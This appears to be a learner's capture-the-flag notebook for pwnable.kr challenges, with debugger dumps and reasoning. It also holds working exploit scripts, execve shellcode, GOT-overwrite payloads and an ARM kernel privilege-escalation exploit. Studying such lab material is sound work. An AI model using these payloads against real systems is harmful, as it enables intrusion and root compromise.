('STACK: ', '0xbfdedea4', ' HEAP: ', '0x88b1410')

[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0x0 
ECX: 0xfbad2088 
EDX: 0x88b141c ("AAAA\264\336\336\277CCCC\034\024\213\b\264\336\336\277c")
ESI: 0x1 
EDI: 0xb7754000 --> 0x1b2db0 
EBP: 0xbfdedeb8 --> 0x0 
ESP: 0xbfdedea0 --> 0x1 
EIP: 0x80485ff (<main+208>:   mov    ecx,DWORD PTR [ebp-0x4])
EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]

What the above essentially shows is that ebp has a 20 byte difference from the start of the stack leak, which when subtracted by 4, gives a 16 byte offset between the two.

So I need to use the stack address + 0x10.
Then, in <main+212>, my value (currently FFFF) is subtracted by 4 and the memory at that location is loaded as the next instruction.

So what I need to do is have the memory address of shell in my input, and then I replace FFFF with the memory address of that memory address + 4. In this case, since the heap data begins 8 bytes after the heap address leak, it would be an offset of (8 + 4 = c).

So I would use heap + 0xc.

The exact python script I used should be called unlink.py.

Tips: 
Start up GDB
Start up python script, send all the input you need
make sure to include connection.interactive()
locate the PID stated in the script output
use GDB to type 'attach PID' (obv replace PID)
then you can use GDB as usual (you may have to type c in both terminals)

new one? Look for one on ports and networks.


-----------------------------------------
bf

So, I actually had a lot of trouble with this one. So I looked up a solution and instead spent some time analyzing it. (Thank God I actually learned something from it or else this would've just been a case of laziness).

So, for this challenge, you essentially need to use brainfuck instructions with the exceptions of [ ], which creates a loop

(Below ripped right from Wikipedia)
Character   Meaning 
>           increment the data pointer (to point to the next cell to the right).
<           decrement the data pointer (to point to the next cell to the left).
+           increment (increase by one) the byte at the data pointer.
-           decrement (decrease by one) the byte at the data pointer.
.           output the byte at the data pointer.
,           accept one byte of input, storing its value in the byte at the data pointer.

The bug that this program has is that it allows you to decrement to a negative position in the brainfuck array. When you look at the other instructions, this reveals that you have the capability to read and write from memory. However, the range you can actually act in is quite limited. My initial plan was to decrement the data pointer until I reached a GOT function's address so I could override it with the address of my shellcode. 

However, brainfuck's limitation only allows me to use pre-existing code, or else it segfaults (NX is activated). So this means that I need to override the GOT function with another function more useful to me. Since there isn't a give_shell function or anything, I need to somehow enter the string "/bin/sh\x00" and call system with that as its parameter.

So, looking through the disassembly, I spot two function calls very close to each other in main:

   0x08048717 <+166>:   call   0x80484c0 <memset@plt>
   0x0804871c <+171>:   mov    eax,ds:0x804a040
   0x08048721 <+176>:   mov    DWORD PTR [esp+0x8],eax
   0x08048725 <+180>:   mov    DWORD PTR [esp+0x4],0x400
   0x0804872d <+188>:   lea    eax,[esp+0x2c]
   0x08048731 <+192>:   mov    DWORD PTR [esp],eax
   0x08048734 <+195>:   call   0x8048450 <fgets@plt>

If I override memset with gets and fgets with system, I can input /bin/sh into a system call. 

from pwn import *

p = process('./bf')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')
p.recvline_startswith('type')
p.sendline('<'*112+'.'+'.>'*4+'<'*4+',>'*4+'<'*(4+32)+',>'*4+'<'*4+'>'*28+',>'*4+'.')
p.recv(1)
x=p.recv(4)[::-1]

jump=0x080484E0
p.send(p32(jump))

system=int(x.encode('hex'),16)-libc.symbols['putchar']+libc.symbols['system']
gets=int(x.encode('hex'),16)-libc.symbols['putchar']+libc.symbols['gets']

print(x.encode('hex'))
print(hex(system))
p.send(p32(system))
p.send(p32(gets))
p.sendline('/bin/sh\x00')
p.interactive()

p.sendline('<'*112+'.'+'.>'*4+'<'*4+',>'*4+'<'*(4+32)+',>'*4+'<'*4+'>'*28+',>'*4+'.') is perhaps the most important line.
The first 112 '<' is to go back 112 spots from the initial memory location of the array to get to the function address of putchar so it can be overriden with (in this case) the _start function in c, which essentially just warps you back to the start of main. 

The next '.' is to initialize the function putchar so that it's address can be locked (it's randomized each time the program is run), while the next '.>' * 4 is to output the randomized location where putchar is at. This is so calculations can be made and offsets can be applied in order to find the locations of other GOT functions. 

The next '<' * (4 + 32) moves you back to override fgets (0x804a030 - 32 = 0x804a010, which is fgets location) with the value that allows you to call system. The rest of the code is just overriding memset with gets, and a final '.' which calls putchar (which now is _start) and then consequently calls memset and fgets to create a shell for you.


Tips: When given a libc or NX is on, consider the approach in which you override functions to get a shell

$(python -c 'print "<" * 112 + "." + ",>" * 4 + ".\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80\n" + "\xfe\xef\xff\xbf"')

Above is my code that would probably work is NX was disabled.



-----------------------------------------
md5 - Incomplete (come back later)

Notes:   Look at custom methods first. Don't waste time going through standard methods like srand. (assembly)
         Keep staring... Unless it's advertised as a hard challenge, the problem lies within those methods.


ebp-0x38 stores the counter variable.
ebp-0x34 + 4 * x stores the random number.

ebp-0x34 = 3a331

Steps:
0x401 + 0x3a0d68 (store in ebp-0x30)
+
0x6c486 - 0x1074
+
0x3fc67 + 0x631bc9df
+
0x51e7 - 0x19fa

1 + 5  + 2 - 3 + 8 + 7 + 4 - 6 (no 0)
Important to note: 8 IS THE STACK CANARY

So you want to get the 

edx xor'd w/ *stack cookie (= 0)
0xbffff324: 0xbffff32c  0xd5fb8f21  0x3a331ca5  0x401a0810
0xbffff334: 0x6c486787  0x107448ff  0x51e7dc99  0x3a0d6889
0xbffff344: 0x19faf11f  0x631bc9df  0x3fc67400  0x598f9853
0xbffff354: 0x00000000  0xbffff388  0x08049107  0x598f9853
0xbffff364: 0x00000000  0x00000001  0x00000000  0xb7d8e3dc


Up to +66, generates 7 random numbers and stores them.


[-------------------------------------code-------------------------------------]
   0x8048ed9 <my_hash+1>:  mov    ebp,esp
   0x8048edb <my_hash+3>:  push   ebx
   0x8048edc <my_hash+4>:  sub    esp,0x34
=> 0x8048edf <my_hash+7>:  mov    eax,gs:0x14
   0x8048ee5 <my_hash+13>: mov    DWORD PTR [ebp-0xc],eax
   0x8048ee8 <my_hash+16>: xor    eax,eax
   0x8048eea <my_hash+18>: lea    eax,[ebp-0x2c]
   0x8048eed <my_hash+21>: mov    DWORD PTR [ebp-0x34],eax
[------------------------------------stack-------------------------------------]

[----------------------------------registers-----------------------------------]
EAX: 0xe3365400 
EBX: 0x0 
ECX: 0x4b22bf6d 
EDX: 0xb7d8e3e4 --> 0xb7d8e070 --> 0x1d855307 
ESI: 0x1 
EDI: 0xb7d8e000 --> 0x1b2db0 
EBP: 0xbffff358 --> 0xbffff388 --> 0x0 
ESP: 0xbffff320 --> 0xb7d8ed60 --> 0xfbad2a84 
EIP: 0x8048ee5 (<my_hash+13>: mov    DWORD PTR [ebp-0xc],eax)
EFLAGS: 0x200282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]

This shows stack canary in this case is == 0xe3365400.

*insert explanation about addition of variables here*

0xbffff324: 0xbffff32c  0x96ab4254  0x470f7d35  0x3e8ad898
0xbffff334: 0x7a9c0da3  0x6a38db9e  0x0582007d  0x7b13b7a7
0xbffff344: 0x3b65607d  0x1f568c10  0xe3365400  0x598fb6e2
0xbffff354: 0x00000000  0xbffff388  0x08049107  0x598fb6e2
0xbffff364: 0x00000000  0x00000001  0x00000000  0xb7d8e3dc

NOTICE stack canary is located at 0xbffff34c, or aka the position of 8 in the number addition.

Therefore if I find the first 8 iterations of the rand, perform operations as the program would on them, and then subtract it from the random number given out so that I can get the stack canary! whoo!



=> 0x0804929c <+0>:  push   ebp
   0x0804929d <+1>:  mov    ebp,esp
   0x0804929f <+3>:  sub    esp,0x28
   0x080492a2 <+6>:  mov    eax,DWORD PTR [ebp+0x8]
   0x080492a5 <+9>:  mov    DWORD PTR [esp+0x8],eax
   0x080492a9 <+13>: mov    DWORD PTR [esp+0x4],0x811eb40
   0x080492b1 <+21>: lea    eax,[ebp-0x14]
   0x080492b4 <+24>: add    eax,0xc
   0x080492b7 <+27>: mov    DWORD PTR [esp],eax
   0x080492ba <+30>: call   0x8069660 <memcpy>
   0x080492bf <+35>: mov    DWORD PTR [esp+0x4],0xc
   0x080492c7 <+43>: lea    eax,[ebp-0x14]
   0x080492ca <+46>: mov    DWORD PTR [esp],eax
   0x080492cd <+49>: call   0x8049188 <calc_md5>
   0x080492d2 <+54>: mov    DWORD PTR [ebp-0xc],eax
   0x080492d5 <+57>: mov    eax,DWORD PTR [ebp-0xc]
   0x080492d8 <+60>: mov    DWORD PTR [esp+0x4],eax
   0x080492dc <+64>: mov    DWORD PTR [esp],0x80da677
   0x080492e3 <+71>: call   0x805b630 <printf>
   0x080492e8 <+76>: mov    eax,DWORD PTR [ebp-0xc]
   0x080492eb <+79>: mov    DWORD PTR [esp+0x4],eax
   0x080492ef <+83>: mov    DWORD PTR [esp],0x80da684
   0x080492f6 <+90>: call   0x80482f0
   0x080492fb <+95>: test   eax,eax
   0x080492fd <+97>: jne    0x8049306 <auth+106>
   0x080492ff <+99>: mov    eax,0x1
   0x08049304 <+104>:   jmp    0x804930b <auth+111>
   0x08049306 <+106>:   mov    eax,0x0
   0x0804930b <+111>:   leave  
   0x0804930c <+112>:   ret  


-----------------------------------------
login

So, I actually made this challenge way harder than it was probably ever intended to be by completely forgetting about the fact that in the disassembly, there is a blatant Base64Decode method. I guess it never occured to me that despite all my attempts at putting in 0x41's, I never got could find any of the input...

Well, once I figured that out, the program becomes significantly easier (and after I spent way too long looking through random assembly instructions the program went through). 

Essentially, the program just comes down to these two instructions: 

[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0x80481d0 (<_init>:	push   ebx)
ECX: 0x32 ('2')
EDX: 0x80da684 ("f87cd601aa7fedca99018a8be88eda34")
ESI: 0x0 
EDI: 0x811b00c --> 0x80a6470 (<__stpcpy_sse2>:	mov    edx,DWORD PTR [esp+0x4])
EBP: 0x43434343 ('CCCC')
ESP: 0xbffff350 --> 0xc ('\x0c')
EIP: 0x8049424 (<main+279>:	leave)
EFLAGS: 0x200297 (CARRY PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8049413 <main+262>:	mov    DWORD PTR [esp],0x80da6ba
   0x804941a <main+269>:	call   0x805c2d0 <puts>
   0x804941f <main+274>:	mov    eax,0x0
=> 0x8049424 <main+279>:	leave  
   0x8049425 <main+280>:	ret    

What leave does is allow you to replace the value of esp with ebp. (mov esp, ebp -> pop ebp)
However, this doesn't give control over EIP quite yet (which I actually want to change).
The next instruction, though, ret allows $esp to transfer into eip. The one thing to note, however, is that during this process of moving an instruction along, the position of esp is incremented by 4. So I have to take that into account when choosing the location to jump to (just subtract it by 4).

The most important thing is the ret command, which loads $esp into eip. Since the value of the function I want to jump to (0x08049278) is most likely just not written in the program, I take the easy way out and instead link it back to where the input is (0x0811eb40) where I will manually put the location of the method.

>>> print "ABCD\x78\x92\x04\x08\x40\xeb\x11\x08".encode('base64')
QUJDRHiSBAhA6xEI


-----------------------------------------
otp

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>

int main(int argc, char* argv[]){
	char fname[128];
	unsigned long long otp[2];

	if(argc!=2){
		printf("usage : ./otp [passcode]\n");
		return 0;
	}

	int fd = open("/dev/urandom", O_RDONLY);
	if(fd==-1) exit(-1);

	if(read(fd, otp, 16)!=16) exit(-1);
	close(fd);

	sprintf(fname, "/tmp/%llu", otp[0]);
	FILE* fp = fopen(fname, "w");
	if(fp==NULL){ exit(-1); }
	fwrite(&otp[1], 8, 1, fp);
	fclose(fp);

	printf("OTP generated.\n");

	unsigned long long passcode=0;
	FILE* fp2 = fopen(fname, "r");
	if(fp2==NULL){ exit(-1); }
	fread(&passcode, 8, 1, fp2);
	fclose(fp2);
	
	if(strtoul(argv[1], 0, 16) == passcode){
		printf("Congratz!\n");
		system("/bin/cat flag");
	}
	else{
		printf("OTP mismatch\n");
	}

	unlink(fname);
	return 0;
}

What I learned: the existence of ulimit. This gives file creation a set "limit", which when written, can effectively make the program create empty files. This allows me to essentially make an empty password.
				Also look for unnecessary steps - in this case, the program had NO NEED TO MAKE A FILE.

(Anyways, w/ the help of Google, the below was the solution):

ulimit -f 0
python /tmp/otp.py

otp.py:
import subprocess
subprocess.Popen(['/home/otp/otp', ''], stderr=subprocess.STDOUT)


--------------------------------------------------------------
echo1

Below is the solution:

(python -c 'print "\xff\xe4" + "\n1\n" + "A" * 40 + "\xa0\x20\x60\x00\x00\x00\x00\x00" + "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"')
H4d_som3_fun_w1th_ech0_ov3rfl0w

I didn't really learn too much, so I'll just write down what I should and shouldn't have done.

My process approaching:
1. Decompile w/ IDA
2. CHECKSEC the program
3. Analyze for bugs - don't get caught up in segfaults at weird inputs (look for big bugs that actually return)
4. Try to look at weird code segments in IDA - chances are they're part of the exploit


I first tried to generate a ROP chain, but then issues began cropping up as to how I was to call a function with /bin/sh. Before going further, Jack recommended I look at checksec (which showed that NX was disabled), and to run some shellcode. I initially attempted storing the shellcode in the username, but later dropped that approach in favor of one that replaced the username with "\xff\xe4", or jmp esp. The program can be made to ret to the username, so I could call stack from there (avoiding getting a leak). The stack, of course, I had already overriden with shellcode.


--------------------------------------------------------------
syscall

[+] Flag: Congratz!! addr_limit looks quite IMPORTANT now... huh?

greet.txt = "\x00\x00\xea\x80\x49\xfe\x00\xeb\x5b\xfd\x00\xeb\x47\x70"

#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <sys/stat.h>
#include <fcntl.h>

void main() {

  int fd = open("greet.txt", O_RDONLY);
  mmap (0 , 4096 , PROT_READ | PROT_WRITE | PROT_EXEC ,MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS, fd , 0);
  
  
  char memory[] = "\x00\x00\x00\x00";
  char *pointer = (char *)0x8000e6c4; //sys_upper function ptr location
  syscall(223, memory, pointer);
  syscall(223);
  
  char flag[128];
  FILE * fp = fopen("/root/flag","r");
 
  fgets(flag, 128, fp);
  printf("[+] Flag: %s", flag);

  fclose(fp);
}


The above is the solution. But the question is how did I actually use it, and why.

The literal linux terms were:
echo -n -e \x00\x00\xea\x80\x49\xfe\x00\xeb\x5b\xfd\x00\xeb\x47\x70" > greet.txt
cat > test.c (then copy/paste c code)
gcc test.c
./a.out

I'll explain the C code. So this challenge was kernel exploitation - this ultimately amounts to calling
commit_creds(prepare_kernel_cred(0)) somewhere in the function. I tried deliberately putting the functions into the code, but I was unable to access the functions this way.

So I decided to take another approach - more specifically, I would mmap out a section of memory with prepared shellcode, then using the exploitable syscall sys_upper (given in C code), I would edit the function pointer of syscall 223 (the syscall that handles sys_upper) to instead point to my shellcode instead of sys_upper.

Writing Shellcode:
So I decided to do cat /proc/kallsyms, which prints out the hardcoded memory locations of each system call. Running grep on it for commit_creds and prepare_kernel_cred returned the below:

8003f924 T prepare_kernel_cred
8003f56c T commit_creds

The shellcode itself is pretty easy: below is it in x86:
xor eax, eax
call 0x8003f924
call 0x8003f56c
ret

Unfortunately, I have to write it in ARM, not x86, so with the help of this website: http://armconverter.com/
I was able to convert the below:
EOR R0, R0, R0  - 0000EA80   ARM equivalent of xor eax, eax
BL	#0x8003f924 - 49FE00EB   ARM equivalent of call 0x8003f924
BL	#0x8003f56c - 5BFD00EB   ARM equivalent of call 0x8003f56c
BX LR   		- 4770       ARM equivalent of ret

into this: \x00\x00\xea\x80\x49\xfe\x00\xeb\x5b\xfd\x00\xeb\x47\x70 (which you may notice is greet.txt).

So now I have my shellcode, I dump it into a sample greet.txt file, which I then open and mmap to position 0x00000000 in memory. (I initially tried memcpy, but it kept segfaulting for some reason). I then calculate the syscall position of syscall 223 (since I'm given that syscall is located at 0x8000e348) as 0x8000e348 + 0x4 * 223 = 0x8000e6c4 (char * pointer in my code). I then overwrite that with 0x00000000 w/ the assistance of sys_upper. I then call sys_upper (which is now 0x00000000) again to call my shellcode, which puts me in ring 0. 

Apparently calling system("/bin/sh") has permission issues at this point, so after messing around a bit, I just decided to read in the flag and print it from there.

Problem is you can't mmap to 0 - apparently it holds system calls. Instead map to anywhere that ends in three 000's
(or is page aligned).

--------------------------------------------------------------
from pwn import *

#p = process('./echo2')
p = remote("pwnable.kr",9011)


shellcode = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
p.sendline(shellcode)
p.sendline("2\n%10$p")

p.recvuntil("hello")
p.recvline()
output = p.recvline()
num = int(output, 16)
offset = -32

location = offset + num
print hex(num)

p.sendline("4\nn\n3\n" + "B" * 24 + p64(location))
p.interactive()

bug: cleanup() removes pointer, echo3() allows an overwrite into the cleanup() block, allows you to control a function pointer. echo2() is a standard FSB. 

Things I learned: to use %p over %llx for FSBs.
				  to keep looking for a bug. I initially used %2$llx (which works on a binary but fails on nc)
				  then it ended up getting swapped to %10$p after some help.


--------------------------------------------------------------
dragon

Not much to say, just realize that Mama Dragon's health can overflow to 0.

(python -c 'print "1\n2\n2\n1\n3\n3\n2\n3\n3\n2\n3\n3\n2\n3\n3\n2\n" + "\xbf\x8d\x04\x08"'; cat) | nc pwnable.kr 9004

--------------------------------------------------------------
crypto1

Important Realization: Data is inputted as {0}-{1}-{2}, where 2 is the cookie I'll be looking for, 0 is the username, and 1 is the password.

Since the first cipher block CHECKS ONLY FIRST 16 WORDS, if I input a series of 13 * "-", the first cipher block will be 13 "-" + 2 * "-" (it's the string splitter) + first character of cookie.

This is where bruteforce comes into play - now that I know the first 15 characters are composed of "-", I only have one mystery character to work through (this list is also given in sanitize input method!) to find the first 16 words. So I just keep trying all the characters until I get a return that's equivalent to what 13 "-" returns.

Now I also know that the next block is also 16 (given in source code), so you repeat the same process. Just add however many "-" needed to get 31 characters (1 missing to bruteforce) onto the already known 2 * "-" + cookiesegment.


--------------------------------------------------------------
alloca

Given: use -80 as buffer space, then the program will jump to the canary's value and read the value stored there
and put it into EIP.

Problem: I tried flooding env with the shell address but that didn't work (not enough flood)

--------------------------------------------------------------
rsa_calculator

This binary was a rather large one, so the first step I took was to looking for bugs with the help of IDA.
With the help of experience, I was able to locate two useful bugs: one in the form of a buffer overflow and the other in the form of a format string bug. Conveniently, NX is disabled for this binary, so my main plan of attack will be to ret to shellcode.

The buffer overflow occurred in the decrypt method when a size below 0 was entered - since the size check was implemented as a signed integer, the loop that decrements size until it hits 0 never actually works properly. I can basically read unlimited data at this point. Howevever, there also exists a stack canary inside the binary. So it's going to be necessary to leak the canary in order to overwrite the return address of the function.

This is where the Format String Bug comes in handy. It's located in the decrypt method as well when it prints out to you your decrypted result. If you send it a message that when decrypted turns out to be %llx or something, it'll leak the appropriate value. The input I used for decryption was p = 16, q = 16, e = 256, d = 1. In that particular format, sending in a "hex" string of 41414141 returns an output of A. 

From there on, it was a job of writing a python script to locate the particular leaks of the cookie and the stack address, and then inputting it into a buffer so the buffer overflow can ret to it. 